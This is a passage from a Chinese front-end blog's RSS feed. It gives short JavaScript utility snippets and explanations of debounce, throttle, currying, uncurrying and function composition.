      <span>return</span> hexes<span>.</span><span>join</span><span>(</span><span>''</span><span>)</span>
    <span>}</span><span>)</span>

<span>hashBrowser</span><span>(</span>
  <span>JSON</span><span>.</span><span>stringify</span><span>(</span><span>{</span> <span>a</span><span>:</span> <span>'a'</span><span>,</span> <span>b</span><span>:</span> <span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>]</span><span>,</span> <span>foo</span><span>:</span> <span>{</span> <span>c</span><span>:</span> <span>'bar'</span> <span>}</span> <span>}</span><span>)</span>
<span>)</span><span>.</span><span>then</span><span>(</span>console<span>.</span>log<span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br></div></div><h2 id="_22-判断是否为绝对路径"> 22. 判断是否为绝对路径</h2>
<div><pre><code><span>const</span> <span>isAbsoluteURL</span> <span>=</span> <span>str</span> <span>=></span> <span><span>/</span><span>^[a-z][a-z0-9+.-]*:</span><span>/</span></span><span>.</span><span>test</span><span>(</span>str<span>)</span>

<span>isAbsoluteURL</span><span>(</span><span>'https://google.com'</span><span>)</span>
<span>isAbsoluteURL</span><span>(</span><span>'ftp://www.myserver.net'</span><span>)</span>
<span>isAbsoluteURL</span><span>(</span><span>'/foo/bar'</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div><h2 id="_23-判断是否为闰年"> 23. 判断是否为闰年</h2>
<div><pre><code><span>const</span> <span>isLeapYear</span> <span>=</span> <span>year</span> <span>=></span> <span>new</span> <span>Date</span><span>(</span>year<span>,</span> <span>1</span><span>,</span> <span>29</span><span>)</span><span>.</span><span>getMonth</span><span>(</span><span>)</span> <span>===</span> <span>1</span>

<span>isLeapYear</span><span>(</span><span>2019</span><span>)</span>
<span>isLeapYear</span><span>(</span><span>2020</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></div></div><h2 id="_24-手机号隐藏中间四位"> 24. 手机号隐藏中间四位</h2>
<div><pre><code><span>'17777777777'</span><span>.</span><span>replace</span><span>(</span><span><span>/</span><span>^(\d{3})\d{4}(\d{4})$</span><span>/</span></span><span>,</span> <span>'$1****$2'</span><span>)</span>
</code></pre>
<div><span>1</span><br></div></div><h2 id="_25-提取-url-请求参数"> 25. 提取 url 请求参数</h2>
<div><pre><code><span>const</span> <span>queryStringToObject</span> <span>=</span> <span>url</span> <span>=></span>
  <span>[</span><span>...</span><span>new</span> <span>URLSearchParams</span><span>(</span>url<span>.</span><span>split</span><span>(</span><span>'?'</span><span>)</span><span>[</span><span>1</span><span>]</span><span>)</span><span>]</span><span>.</span><span>reduce</span><span>(</span>
    <span>(</span><span>a<span>,</span> <span>[</span>k<span>,</span> v<span>]</span></span><span>)</span> <span>=></span> <span>(</span><span>(</span>a<span>[</span>k<span>]</span> <span>=</span> v<span>)</span><span>,</span> a<span>)</span><span>,</span>
    <span>{</span><span>}</span>
  <span>)</span>

<span>queryStringToObject</span><span>(</span><span>'https://google.com?page=1&amp;count=10'</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></div></div><h2 id="_26-生成随机颜色"> 26. 生成随机颜色</h2>
<div><pre><code><span>const</span> <span>randomHexColorCode</span> <span>=</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
  <span>let</span> n <span>=</span> <span>(</span>Math<span>.</span><span>random</span><span>(</span><span>)</span> <span>*</span> <span>0xfffff</span> <span>*</span> <span>1000000</span><span>)</span><span>.</span><span>toString</span><span>(</span><span>16</span><span>)</span>
  <span>return</span> <span>'#'</span> <span>+</span> n<span>.</span><span>slice</span><span>(</span><span>0</span><span>,</span> <span>6</span><span>)</span>
<span>}</span>

<span>randomHexColorCode</span><span>(</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></div></div><h2 id="_27-读取-txt-文件每行数据"> 27. 读取 txt 文件每行数据</h2>
<div><pre><code><span>const</span> fs <span>=</span> <span>require</span><span>(</span><span>'fs'</span><span>)</span>

<span>const</span> <span>readFileLines</span> <span>=</span> <span>filename</span> <span>=></span>
  fs
    <span>.</span><span>readFileSync</span><span>(</span>filename<span>)</span>
    <span>.</span><span>toString</span><span>(</span><span>'UTF8'</span><span>)</span>
    <span>.</span><span>split</span><span>(</span><span>'\n'</span><span>)</span>

<span>readFileLines</span><span>(</span><span>'test.txt'</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br></div></div><h2 id="_28-每帧动画执行回调函数"> 28. 每帧动画执行回调函数</h2>
<div><pre><code><span>const</span> <span>recordAnimationFrames</span> <span>=</span> <span>(</span><span>callback<span>,</span> autoStart <span>=</span> <span>true</span></span><span>)</span> <span>=></span> <span>{</span>
  <span>let</span> running <span>=</span> <span>false</span><span>,</span>
    raf
  <span>const</span> <span>stop</span> <span>=</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
    <span>if</span> <span>(</span><span>!</span>running<span>)</span> <span>return</span>
    running <span>=</span> <span>false</span>
    <span>cancelAnimationFrame</span><span>(</span>raf<span>)</span>
  <span>}</span>
  <span>const</span> <span>start</span> <span>=</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
    <span>if</span> <span>(</span>running<span>)</span> <span>return</span>
    running <span>=</span> <span>true</span>
    <span>run</span><span>(</span><span>)</span>
  <span>}</span>
  <span>const</span> <span>run</span> <span>=</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
    raf <span>=</span> <span>requestAnimationFrame</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
      <span>callback</span><span>(</span><span>)</span>
      <span>if</span> <span>(</span>running<span>)</span> <span>run</span><span>(</span><span>)</span>
    <span>}</span><span>)</span>
  <span>}</span>
  <span>if</span> <span>(</span>autoStart<span>)</span> <span>start</span><span>(</span><span>)</span>
  <span>return</span> <span>{</span> start<span>,</span> stop <span>}</span>
<span>}</span>

<span>const</span> <span>cb</span> <span>=</span> <span>(</span><span>)</span> <span>=></span> console<span>.</span><span>log</span><span>(</span><span>'Animation frame fired'</span><span>)</span>
<span>const</span> recorder <span>=</span> <span>recordAnimationFrames</span><span>(</span>cb<span>)</span>
recorder<span>.</span><span>stop</span><span>(</span><span>)</span>
recorder<span>.</span><span>start</span><span>(</span><span>)</span>
<span>const</span> recorder2 <span>=</span> <span>recordAnimationFrames</span><span>(</span>cb<span>,</span> <span>false</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br></div></div><h2 id="_29-去除-html-xml-标签"> 29. 去除 HTML/XML 标签</h2>
<div><pre><code><span>const</span> <span>stripHTMLTags</span> <span>=</span> <span>str</span> <span>=></span> str<span>.</span><span>replace</span><span>(</span><span><span>/</span><span>&lt;[^>]*></span><span>/</span><span>g</span></span><span>,</span> <span>''</span><span>)</span>

<span>stripHTMLTags</span><span>(</span><span>'&lt;p>&lt;em>lorem&lt;/em> &lt;strong>ipsum&lt;/strong>&lt;/p>'</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><h2 id="_30-转小驼峰"> 30. 转小驼峰</h2>
<div><pre><code><span>const</span> <span>toCamelCase</span> <span>=</span> <span>str</span> <span>=></span> <span>{</span>
  <span>let</span> s <span>=</span>
    str <span>&amp;&amp;</span>
    str
      <span>.</span><span>match</span><span>(</span>
        <span><span>/</span><span>[A-Z]{2,}(?=[A-Z][a-z]+[0-9]*|\b)|[A-Z]?[a-z]+[0-9]*|[A-Z]|[0-9]+</span><span>/</span><span>g</span></span>
      <span>)</span>
      <span>.</span><span>map</span><span>(</span><span>x</span> <span>=></span> x<span>.</span><span>slice</span><span>(</span><span>0</span><span>,</span> <span>1</span><span>)</span><span>.</span><span>toUpperCase</span><span>(</span><span>)</span> <span>+</span> x<span>.</span><span>slice</span><span>(</span><span>1</span><span>)</span><span>.</span><span>toLowerCase</span><span>(</span><span>)</span><span>)</span>
      <span>.</span><span>join</span><span>(</span><span>''</span><span>)</span>
  <span>return</span> s<span>.</span><span>slice</span><span>(</span><span>0</span><span>,</span> <span>1</span><span>)</span><span>.</span><span>toLowerCase</span><span>(</span><span>)</span> <span>+</span> s<span>.</span><span>slice</span><span>(</span><span>1</span><span>)</span>
<span>}</span>

<span>toCamelCase</span><span>(</span><span>'some_database_field_name'</span><span>)</span>
<span>toCamelCase</span><span>(</span><span>'Some label that needs to be camelized'</span><span>)</span>
<span>toCamelCase</span><span>(</span><span>'some-javascript-property'</span><span>)</span>
<span>toCamelCase</span><span>(</span><span>'some-mixed_string with spaces_underscores-and-hyphens'</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br></div></div><h2 id="_31-神奇的-intl"> 31. 神奇的 Intl</h2>
<div><pre><code><span>new</span> <span>Intl<span>.</span>DateTimeFormat</span><span>(</span><span>'zh-CN'</span><span>,</span> <span>{</span>
  <span>year</span><span>:</span> <span>'numeric'</span><span>,</span>
  <span>month</span><span>:</span> <span>'2-digit'</span><span>,</span>
  <span>weekday</span><span>:</span> <span>'long'</span><span>,</span>
  <span>day</span><span>:</span> <span>'2-digit'</span><span>,</span>
  <span>hour</span><span>:</span> <span>'2-digit'</span><span>,</span>
  <span>minute</span><span>:</span> <span>'2-digit'</span><span>,</span>
  <span>second</span><span>:</span> <span>'2-digit'</span><span>,</span>
  <span>hour12</span><span>:</span> <span>false</span><span>,</span>
<span>}</span><span>)</span>
  <span>.</span><span>format</span><span>(</span><span>new</span> <span>Date</span><span>(</span><span>)</span><span>)</span>
  <span>.</span><span>replace</span><span>(</span><span><span>/</span><span>星期[^]?</span><span>/</span></span><span>,</span> <span>' '</span><span>)</span>

<span>new</span> <span>Intl<span>.</span>NumberFormat</span><span>(</span><span>'zh-CN'</span><span>)</span><span>.</span><span>format</span><span>(</span><span>1234567890</span><span>)</span>

<span>new</span> <span>Intl<span>.</span>NumberFormat</span><span>(</span><span>'zh-Hans-CN-u-nu-hanidec'</span><span>)</span><span>.</span><span>format</span><span>(</span><span>1234567890</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br></div></div><h2 id="_32-反转义-html"> 32. 反转义 HTML</h2>
<div><pre><code><span>const</span> <span>unescapeHTML</span> <span>=</span> <span>str</span> <span>=></span>
  str<span>.</span><span>replace</span><span>(</span>
    <span><span>/</span><span>&amp;amp;|&amp;lt;|&amp;gt;|&amp;#39;|&amp;quot;</span><span>/</span><span>g</span></span><span>,</span>
    <span>tag</span> <span>=></span>
      <span>(</span><span>{</span>
        <span>'&amp;amp;'</span><span>:</span> <span>'&amp;'</span><span>,</span>
        <span>'&amp;lt;'</span><span>:</span> <span>'&lt;'</span><span>,</span>
        <span>'&amp;gt;'</span><span>:</span> <span>'>'</span><span>,</span>
        <span>'&amp;#39;'</span><span>:</span> <span>"'"</span><span>,</span>
        <span>'&amp;quot;'</span><span>:</span> <span>'"'</span><span>,</span>
      <span>}</span><span>[</span>tag<span>]</span> <span>||</span> tag<span>)</span>
  <span>)</span>

<span>unescapeHTML</span><span>(</span><span>'&amp;lt;a href=&amp;quot;#&amp;quot;&amp;gt;Me &amp;amp; you&amp;lt;/a&amp;gt;'</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br></div></div><h2 id="_33-link-创建-a-标签"> 33. link 创建 a 标签</h2>
<div><pre><code><span>'google'</span><span>.</span><span>link</span><span>(</span><span>'https://www.google.com'</span><span>)</span>
</code></pre>
<div><span>1</span><br></div></div><h2 id="_34-sleep-函数"> 34. sleep 函数</h2>
<div><pre><code><span>// while</span>
<span>const</span> <span>sleep</span> <span>=</span> <span>delay</span> <span>=></span> <span>{</span>
  <span>const</span> start <span>=</span> Date<span>.</span><span>now</span><span>(</span><span>)</span>
  <span>while</span> <span>(</span>Date<span>.</span><span>now</span><span>(</span><span>)</span> <span>&lt;</span> start <span>+</span> delay<span>)</span> <span>continue</span>
<span>}</span>

<span>// Promise</span>
<span>const</span> <span>sleep</span> <span>=</span> <span>delay</span> <span>=></span> <span>new</span> <span>Promise</span><span>(</span><span>resolve</span> <span>=></span> <span>setTimeout</span><span>(</span>resolve<span>,</span> delay<span>)</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br></div></div><h2 id="_35-伞兵"> 35. 伞兵</h2>
<div><pre><code><span>(</span><span>!</span><span>~</span><span>+</span><span>[</span><span>]</span> <span>+</span> <span>{</span><span>}</span><span>)</span><span>[</span><span>--</span><span>[</span><span>~</span><span>+</span><span>''</span><span>]</span><span>[</span><span>+</span><span>[</span><span>]</span><span>]</span> <span>*</span> <span>[</span><span>~</span><span>+</span><span>[</span><span>]</span><span>]</span> <span>+</span> <span>~</span><span>~</span><span>!</span><span>+</span><span>[</span><span>]</span><span>]</span> <span>+</span> <span>(</span><span>{</span><span>}</span> <span>+</span> <span>[</span><span>]</span><span>)</span><span>[</span><span>[</span><span>~</span><span>!</span><span>+</span><span>[</span><span>]</span><span>]</span> <span>*</span> <span>~</span><span>+</span><span>[</span><span>]</span><span>]</span>
</code></pre>
<div><span>1</span><br></div></div>]]></content:encoded>
    </item>
    <item>
      <title>JS 高级</title>
      <link>https://www.matrixtheone.ga/web/note/Advanced/</link>
      <guid>https://www.matrixtheone.ga/web/note/Advanced/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">JS 高级</source>
      <category>JS 高级</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-防抖函数"> 1. 防抖函数</h2>
<ul>
<li>
<p>频繁触发事件中，若在 n 秒内事件再次被触发，清除前面的事件，重新计时。</p>
<blockquote>
<p>应用：搜索联想、窗口改变等。</p>
</blockquote>
</li>
</ul>
<div><pre><code><span>const</span> <span>debounce</span> <span>=</span> <span>(</span><span>fn<span>,</span> wait <span>=</span> <span>500</span></span><span>)</span> <span>=></span> <span>{</span>
  <span>let</span> timer
  <span>return</span> <span>function</span><span>(</span><span><span>...</span>args</span><span>)</span> <span>{</span>
    <span>clearTimeout</span><span>(</span>timer<span>)</span>
    timer <span>=</span> <span>setTimeout</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>fn</span><span>.</span><span>apply</span><span>(</span><span>this</span><span>,</span> args<span>)</span><span>,</span> wait<span>)</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></div></div><h2 id="_2-节流函数"> 2. 节流函数</h2>
<ul>
<li>
<p>频繁触发事件中，n 秒内只会执行一次。</p>
<blockquote>
<p>应用：鼠标点击、窗口滚动等。</p>
</blockquote>
</li>
</ul>
<div><pre><code><span>const</span> <span>throttle</span> <span>=</span> <span>(</span><span>fn<span>,</span> wait <span>=</span> <span>500</span></span><span>)</span> <span>=></span> <span>{</span>
  <span>let</span> inThrottle<span>,</span> timer<span>,</span> lastTime
  <span>return</span> <span>function</span><span>(</span><span><span>...</span>args</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>!</span>inThrottle<span>)</span> <span>{</span>
      <span>fn</span><span>.</span><span>apply</span><span>(</span><span>this</span><span>,</span> args<span>)</span>
      lastTime <span>=</span> Date<span>.</span><span>now</span><span>(</span><span>)</span>
      inThrottle <span>=</span> <span>true</span>
    <span>}</span> <span>else</span> <span>{</span>
      <span>clearTimeout</span><span>(</span>timer<span>)</span>
      timer <span>=</span> <span>setTimeout</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
        <span>if</span> <span>(</span>Date<span>.</span><span>now</span><span>(</span><span>)</span> <span>-</span> lastTime <span>>=</span> wait<span>)</span> <span>{</span>
          <span>fn</span><span>.</span><span>apply</span><span>(</span><span>this</span><span>,</span> args<span>)</span>
          lastTime <span>=</span> Date<span>.</span><span>now</span><span>(</span><span>)</span>
        <span>}</span>
      <span>}</span><span>,</span> Math<span>.</span><span>max</span><span>(</span>wait <span>-</span> <span>(</span>Date<span>.</span><span>now</span><span>(</span><span>)</span> <span>-</span> lastTime<span>)</span><span>,</span> <span>0</span><span>)</span><span>)</span>
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br></div></div><h2 id="_3-惰性函数"> 3. 惰性函数</h2>
<ul>
<li>
<p>惰性函数表示函数执行的分支只会在函数第一次调用的时候执行。在第一次调用过程中，该函数会被覆盖为另一个按照合适方式执行的函数，这样任何对原函数的调用就不用再经过执行的分支了。</p>
<blockquote>
<p>应用：浏览器监听事件兼容等。</p>
</blockquote>
</li>
</ul>
<div><pre><code><span>const</span> <span>time</span> <span>=</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
  <span>const</span> timestamp <span>=</span> Date<span>.</span><span>now</span><span>(</span><span>)</span>
  <span>time</span> <span>=</span> <span>_</span> <span>=></span> timestamp
  <span>return</span> <span>time</span><span>(</span><span>)</span>
<span>}</span>

<span>time</span><span>(</span><span>)</span> <span>// => -28800000</span>
<span>time</span><span>(</span><span>)</span> <span>// => -28800000</span>
<span>time</span><span>(</span><span>)</span> <span>// => -28800000</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br></div></div><h2 id="_4-级联函数-链式函数"> 4. 级联函数（链式函数）</h2>
<ul>
<li>
<p>级联函数也叫链式函数，方法链一般适合对一个对象进行连续操作。一定程度上可以减少代码量，缺点是它占用了函数的返回值。</p>
<blockquote>
<p>jQuery 中运用了大量的链式写法。</p>
</blockquote>
</li>
</ul>
<div><pre><code><span>function</span> <span>XueDao</span><span>(</span><span>)</span> <span>{</span><span>}</span>
<span>function</span> <span>setName</span><span>(</span><span>name</span><span>)</span> <span>{</span>
  <span>this</span><span>.</span>name <span>=</span> name
  <span>return</span> <span>this</span>
<span>}</span>
<span>function</span> <span>setAge</span><span>(</span><span>age</span><span>)</span> <span>{</span>
  <span>this</span><span>.</span>age <span>=</span> age
  <span>return</span> <span>this</span>
<span>}</span>
<span>function</span> <span>setWife</span><span>(</span><span>wife</span><span>)</span> <span>{</span>
  <span>this</span><span>.</span>wife <span>=</span> wife
  <span>return</span> <span>this</span>
<span>}</span>

<span>[</span><span>'setName'</span><span>,</span> <span>'setAge'</span><span>,</span> <span>'setWife'</span><span>]</span><span>.</span><span>map</span><span>(</span><span>key</span> <span>=></span> <span>(</span><span>XueDao</span><span>.</span>prototype<span>[</span>key<span>]</span> <span>=</span> <span>eval</span><span>(</span>key<span>)</span><span>)</span><span>)</span>

<span>const</span> role <span>=</span> <span>new</span> <span>XueDao</span><span>(</span><span>)</span>
role
  <span>.</span><span>setName</span><span>(</span><span>'徐扶墙'</span><span>)</span>
  <span>.</span><span>setAge</span><span>(</span><span>17</span><span>)</span>
  <span>.</span><span>setWife</span><span>(</span><span>'姜姒'</span><span>)</span> <span>// => {name: '徐扶墙', age: 17, wife: '姜姒'}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br></div></div><h2 id="_5-偏应用函数"> 5. 偏应用函数</h2>
<ul>
<li>
<p>固定一个函数的一些参数，然后产生另一个更小元的函数。偏函数严格来讲是一个减少函数参数个数的过程。</p>
<blockquote>
<ul>
<li>理念：降低通用性、增加适用性。</li>
<li>作用：参数复用、提前返回、延迟计算/运行。</li>
</ul>
</blockquote>
</li>
</ul>
<div><pre><code><span>const</span> <span>partial</span> <span>=</span> <span>(</span><span>fn<span>,</span> <span>...</span>presetArgs</span><span>)</span> <span>=></span> <span>(</span><span><span>...</span>laterArgs</span><span>)</span> <span>=></span>
  <span>fn</span><span>(</span><span>...</span>presetArgs<span>,</span> <span>...</span>laterArgs<span>)</span>

<span>const</span> <span>add</span> <span>=</span> <span>(</span><span>x<span>,</span> y</span><span>)</span> <span>=></span> x <span>+</span> y

<span>[</span><span>770</span><span>,</span> <span>1550</span><span>]</span><span>.</span><span>map</span><span>(</span><span>partial</span><span>(</span>add<span>,</span> <span>7</span><span>)</span><span>)</span> <span>// => [777, 1557]</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></div></div><h2 id="_6-柯理化函数"> 6. 柯理化函数</h2>
<ul>
<li>
<p>柯里化是偏应用的一种特殊形式。把接受多个参数的函数变换成接受一个单一参数（最初函数的第一个参数）的函数，并且返回接受余下的参数且返回结果为新函数的技术。将一个多参数（higher-arity）函数拆解为一系列的单元链式函数。</p>
<blockquote>
<ul>
<li>理念：降低通用性、增加适用性。</li>
<li>作用：参数复用、提前返回、延迟计算/运行。</li>
</ul>
</blockquote>
</li>
<li>
<p>松散柯里化（一次处理 {0, } 个参数）。</p>
<div><pre><code><span>const</span> <span>currying</span> <span>=</span>
  <span>(</span><span>fn<span>,</span> arity <span>=</span> fn<span>.</span>length</span><span>)</span> <span>=></span>
  <span>(</span><span><span>...</span>args</span><span>)</span> <span>=></span>
    args<span>.</span>length <span>>=</span> arity
      <span>?</span> <span>fn</span><span>(</span><span>...</span>args<span>)</span>
      <span>:</span> <span>currying</span><span>(</span><span>fn</span><span>.</span><span>bind</span><span>(</span><span>null</span><span>,</span> <span>...</span>args<span>)</span><span>,</span> arity <span>-</span> args<span>.</span>length<span>)</span>

<span>const</span> add <span>=</span> <span>currying</span><span>(</span><span>(</span><span><span>...</span>arg</span><span>)</span> <span>=></span> <span>eval</span><span>(</span>arg<span>.</span><span>join</span><span>(</span><span>'+'</span><span>)</span><span>)</span><span>,</span> <span>3</span><span>)</span>
<span>add</span><span>(</span><span>)</span><span>(</span><span>2</span><span>)</span><span>(</span><span>3</span><span>,</span> <span>5</span><span>)</span> <span>// => 10</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br></div></div></li>
<li>
<p>严格柯里化（一次处理 {1, 1} 个参数）。</p>
<div><pre><code><span>const</span> <span>currying</span> <span>=</span>
  <span>(</span><span>fn<span>,</span> arity <span>=</span> fn<span>.</span>length<span>,</span> prevArgs <span>=</span> <span>[</span><span>]</span></span><span>)</span> <span>=></span>
  <span>nextArg</span> <span>=></span> <span>{</span>
    <span>const</span> args <span>=</span> <span>[</span><span>...</span>prevArgs<span>,</span> nextArg<span>]</span>
    <span>return</span> args<span>.</span>length <span>>=</span> arity <span>?</span> <span>fn</span><span>(</span><span>...</span>args<span>)</span> <span>:</span> <span>currying</span><span>(</span>fn<span>,</span> arity<span>,</span> args<span>)</span>
  <span>}</span>

<span>const</span> add <span>=</span> <span>currying</span><span>(</span><span>(</span><span><span>...</span>arg</span><span>)</span> <span>=></span> <span>eval</span><span>(</span>arg<span>.</span><span>join</span><span>(</span><span>'+'</span><span>)</span><span>)</span><span>,</span> <span>3</span><span>)</span>
<span>add</span><span>(</span><span>2</span><span>)</span><span>(</span><span>3</span><span>,</span> <span>4</span><span>)</span><span>(</span><span>5</span><span>)</span> <span>// => 10</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br></div></div></li>
</ul>
<h2 id="_7-反柯里化函数"> 7. 反柯里化函数</h2>
<ul>
<li>
<p>反柯里化，是一个泛型化的过程。它使得被反柯里化的函数，可以接收更多参数。目的是创建一个更普适性的函数，可以被不同的对象使用（有鸠占鹊巢的效果）。</p>
<blockquote>
<p>增加通用性。</p>
</blockquote>
</li>
</ul>
<div><pre><code><span>// JavaScript 之父 Brendan Eich</span>
<span>Function</span><span>.</span>prototype<span>.</span><span>uncurrying</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
  <span>var</span> self <span>=</span> <span>this</span>
  <span>return</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
    <span>var</span> obj <span>=</span> <span>Array</span><span>.</span>prototype<span>.</span><span>shift</span><span>.</span><span>call</span><span>(</span>arguments<span>)</span>
    <span>return</span> <span>self</span><span>.</span><span>apply</span><span>(</span>obj<span>,</span> arguments<span>)</span>
  <span>}</span>
<span>}</span>

<span>// 另一种实现方式</span>
<span>Function</span><span>.</span>prototype<span>.</span><span>uncurrying</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
  <span>var</span> self <span>=</span> <span>this</span>
  <span>return</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>Function</span><span>.</span>prototype<span>.</span><span>call</span><span>.</span><span>apply</span><span>(</span>self<span>,</span> arguments<span>)</span>
  <span>}</span>
<span>}</span>

<span>[</span><span>'shift'</span><span>,</span> <span>'push'</span><span>,</span> <span>'forEach'</span><span>]</span><span>.</span><span>map</span><span>(</span>
  <span>method</span> <span>=></span> <span>(</span>Array<span>[</span>method<span>]</span> <span>=</span> <span>Array</span><span>.</span>prototype<span>[</span>method<span>]</span><span>.</span><span>uncurrying</span><span>(</span><span>)</span><span>)</span>
<span>)</span>

<span>const</span> foo <span>=</span> <span>{</span>
  <span>2</span><span>:</span> <span>2</span><span>,</span>
  <span>3</span><span>:</span> <span>3</span><span>,</span>
  <span>length</span><span>:</span> <span>2</span><span>,</span>
<span>}</span>

<span>// 方法调用会使用/修改 length 哟！</span>
Array<span>.</span><span>shift</span><span>(</span>foo<span>)</span> <span>// foo: {2: 2, 3: 3, length: 1}</span>
Array<span>.</span><span>push</span><span>(</span>foo<span>,</span> <span>5</span><span>)</span> <span>// foo: {1: 5, 2: 2, 3: 3, length: 2}</span>
<span>// length 为 2，遍历截止到索引为 1</span>
Array<span>.</span><span>forEach</span><span>(</span>foo<span>,</span> console<span>.</span>log<span>)</span> <span>// 只打印一次：5 1 {1: 5, 2: 2, 3: 3, length: 2}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br></div></div><h2 id="_8-组合函数"> 8. <a href="https://wizardforcel.gitbooks.io/functional-light-js/content/ch4.html" target="_blank" rel="noopener noreferrer">组合函数</a></h2>
<ul>
<li>
<p>函数组合是指将多个函数按顺序执行，前一个函数的返回值作为下一个函数的参数，最终返回结果。这样做的好处是可以将复杂任务分割成多个子任务，然后通过组合函数再组合成复杂任务。</p>
<blockquote>
<p>应用：中间件等。</p>
</blockquote>
</li>
<li>
<p>同步通用组合函数（从右向左执行）。</p>
<div><pre><code><span>const</span> <span>compose</span> <span>=</span>
  <span>(</span><span><span>...</span>fns</span><span>)</span> <span>=></span>
  <span>(</span><span><span>...</span>args</span><span>)</span> <span>=></span>
    fns<span>.</span><span>reduceRight</span><span>(</span><span>(</span><span>res<span>,</span> fn</span><span>)</span> <span>=></span> <span>fn</span><span>(</span>res<span>)</span><span>,</span> <span>...</span>args<span>)</span>

<span>const</span> <span>add</span> <span>=</span> <span>num</span> <span>=></span> num <span>+</span> <span>7</span>
<span>compose</span><span>(</span>add<span>,</span> add<span>)</span><span>(</span><span>7</span><span>)</span> <span>// => 21</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></div></div></li>
<li>
<p>异步通用组合函数（从右向左执行）。</p>
